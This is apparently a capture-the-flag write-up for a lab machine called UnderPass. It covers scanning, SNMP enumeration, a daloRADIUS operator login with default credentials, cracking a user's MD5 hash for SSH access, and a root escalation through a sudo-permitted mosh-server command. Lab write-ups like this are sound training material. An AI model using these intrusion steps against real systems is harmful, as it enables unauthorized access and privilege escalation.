
ip/hostname: 10.10.11.48/underpass.htb

## Scan
Doing a TCP sacn only gave port 80 and 22 which had nothing in it
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So then moved to an UDP scan which took some while
```
sudo nmap -sU underpass.htb -T5

PORT    STATE SERVICE

161/udp open  snmp
```

## SNMP-CHECK
port 161 running an snmp service
```
> snmp-check 10.10.11.48
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 01:10:37.93
  Uptime system                 : 01:10:27.67
  System date                   : 2025-1-3 21:42:13.0

```

there is a ```daloradius``` services running on it

## fuzzing
```
feroxbuster -u http://underpass.htb/daloradius

[##>-----------------] - 2m      3295/30000   29/s    http://underpass.htb/daloradius/ 
[##>-----------------] - 2m      3007/30000   27/s    http://underpass.htb/daloradius/app/ 
[##>-----------------] - 2m      3019/30000   27/s    http://underpass.htb/daloradius/library/ 
[#>------------------] - 2m      2992/30000   27/s    http://underpass.htb/daloradius/doc/ 
[#>------------------] - 2m      2513/30000   23/s    http://underpass.htb/daloradius/contrib/ 
[##>-----------------] - 2m      3163/30000   30/s    http://underpass.htb/daloradius/setup/ 
[##>-----------------] - 2m      3167/30000   30/s    http://underpass.htb/daloradius/app/common/ 
[#>------------------] - 2m      2888/30000   27/s    http://underpass.htb/daloradius/contrib/scripts/ 
[#>------------------] - 2m      2573/30000   24/s    http://underpass.htb/daloradius/app/users/ 
[#>------------------] - 2m      2667/30000   25/s    http://underpass.htb/daloradius/app/common/templates/ 
[#>------------------] - 2m      2051/30000   20/s    http://underpass.htb/daloradius/app/common/includes/ 
[#>------------------] - 2m      2526/30000   24/s    http://underpass.htb/daloradius/app/common/static/ 
[#>------------------] - 2m      2333/30000   23/s    http://underpass.htb/daloradius/app/common/library/ 
[#>------------------] - 2m      2595/30000   26/s    http://underpass.htb/daloradius/contrib/db/ 
[#>------------------] - 2m      2008/30000   22/s    http://underpass.htb/daloradius/app/users/static/ 
[#>------------------] - 2m      2462/30000   27/s    http://underpass.htb/daloradius/app/users/lang/ 
[#>------------------] - 89s     1947/30000   22/s    http://underpass.htb/daloradius/app/users/library/ 
[#>------------------] - 80s     1981/30000   25/s    http://underpass.htb/daloradius/contrib/scripts/maintenance/ 
```

## more fuzzing
```
feroxbuster -u http://underpass.htb/daloradius/app/

[##>-----------------] - 2m      3058/30000   33/s    http://underpass.htb/daloradius/app/ 
[#>------------------] - 89s     2354/30000   26/s    http://underpass.htb/daloradius/app/common/ 
[#>------------------] - 89s     2407/30000   27/s    http://underpass.htb/daloradius/app/users/ 
[#>------------------] - 84s     1668/30000   20/s    http://underpass.htb/daloradius/app/common/templates/ 
[#>------------------] - 84s     2060/30000   24/s    http://underpass.htb/daloradius/app/common/includes/ 
[#>------------------] - 84s     2305/30000   28/s    http://underpass.htb/daloradius/app/users/include/ 
[#>------------------] - 84s     1664/30000   20/s    http://underpass.htb/daloradius/app/common/static/ 
[#>------------------] - 83s     2175/30000   26/s    http://underpass.htb/daloradius/app/users/static/ 
[#>------------------] - 83s     2350/30000   28/s    http://underpass.htb/daloradius/app/users/lang/ 
[#>------------------] - 83s     1892/30000   23/s    http://underpass.htb/daloradius/app/users/library/ 
[#>------------------] - 83s     2036/30000   25/s    http://underpass.htb/daloradius/app/common/library/ 
[#>------------------] - 83s     2261/30000   27/s    http://underpass.htb/daloradius/app/users/include/config/ 
[#>------------------] - 82s     2463/30000   30/s    http://underpass.htb/daloradius/app/users/include/common/ 
[#>------------------] - 79s     2024/30000   26/s    http://underpass.htb/daloradius/app/users/include/menu/ 
[>-------------------] - 72s     1184/30000   17/s    http://underpass.htb/daloradius/app/users/library/javascript/ 
[>-------------------] - 69s     1274/30000   18/s    http://underpass.htb/daloradius/app/common/static/images/ 
[>-------------------] - 69s     1327/30000   19/s    http://underpass.htb/daloradius/app/common/static/js/ 
[>-------------------] - 69s     1402/30000   20/s    http://underpass.htb/daloradius/app/common/static/css/ 
[>-------------------] - 63s     1298/30000   21/s    http://underpass.htb/daloradius/app/common/library/phpmailer/ 
[>-------------------] - 40s      522/30000   13/s    http://underpass.htb/daloradius/app/users/include/management/ 
```

Navigating to http://underpass.htb/daloradius/app/users/ on the browser we see a login page

![Screenshot from 2025-01-03 22-53-51](https://github.com/user-attachments/assets/ec7c504e-c87f-4e5b-82b4-6c09bcf752fb)

then i was able to find the verison at  **/daloradius/doc/install/INSTALL**

```daloRADIUS version 0.9 stable release```

scrolling down in same page i also saw some credentials
```
5. INSTALLATION COMPLETE
 ------------------------
    Surf to http://yourip/daloradius
    Login:
		username: administrator
		password: radius

    Notice: don't forget to change the default password in the Configuration -> Operators page
			don't forget to also REMOVE completely or rename to some random undetected name the update.php script!
```
 
the creds did not work for the login at **/daloradius/app/users/login.php**

checking through more directories i found **/daloradius/app/operators** which is also a login page

the credentials worked
![loggedin](https://github.com/user-attachments/assets/a719bf5b-e264-470d-b8cb-f9053c9e645d)

going through the page **Management >> list users** i saw an md5 password hash of another user

![md5](https://github.com/user-attachments/assets/dca66001-0088-47e6-87fb-d2ff5911299b)

so cracking the md5 hash
![pass](https://github.com/user-attachments/assets/895812a3-ba6b-49a1-a880-507a886bd7c5)

we have the password ```underwaterfriends``` for user ```svcMosh```

## ssh

```
ssh svcMosh@underpass.htb
The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
svcMosh@underpass.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan  3 10:14:36 PM UTC 2025

  System load:  0.03              Processes:             240
  Usage of /:   93.3% of 3.75GB   Users logged in:       1
  Memory usage: 19%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 93.3% of 3.75GB
  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan  3 21:29:47 2025 from 10.10.16.59
svcMosh@underpass:~$ 

```
the creds worked for ssh login

# Privilege Escalation

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

```
svcMosh@underpass:~$ mosh-server


MOSH CONNECT 60001 AYlVxMxmYg5JOSkArABvtg

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 4328]

```

Seems we have to run the command with ```mosh```

```
svcMosh@underpass:~$ mosh
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")

        --predict=adaptive      local echo for slower links [default]
-a      --predict=always        use local echo even on fast links
-n      --predict=never         never use local echo
        --predict=experimental  aggressively echo even when incorrect

-4      --family=inet        use IPv4 only
-6      --family=inet6       use IPv6 only
        --family=auto        autodetect network type for single-family hosts only
        --family=all         try all network types
        --family=prefer-inet use all network types, but try IPv4 first [default]
        --family=prefer-inet6 use all network types, but try IPv6 first
-p PORT[:PORT2]
        --port=PORT[:PORT2]  server-side UDP port or range
                                (No effect on server-side SSH port)
        --bind-server={ssh|any|IP}  ask the server to reply from an IP address
                                       (default: "ssh")

        --ssh=COMMAND        ssh command to run when setting up session
                                (example: "ssh -p 2222")
                                (default: "ssh")

        --no-ssh-pty         do not allocate a pseudo tty on ssh connection

        --no-init            do not send terminal initialization string

        --local              run mosh-server locally without using ssh

        --experimental-remote-ip=(local|remote|proxy)  select the method for
                             discovering the remote IP address to use for mosh
                             (default: "proxy")

        --help               this message
        --version            version and copyright information

```

## root-flag

We can see the  **--server=COMMAND** The default parameter command is mosh-server, and the super privilege command owned by the current user is also this 

RUN 
```
mosh --server="sudo /usr/bin/mosh-server" localhost
```
after running that, we will get access as root

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan  3 10:21:34 PM UTC 2025

  System load:  0.37              Processes:             272
  Usage of /:   93.9% of 3.75GB   Users logged in:       1
  Memory usage: 20%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 93.9% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~# 
```
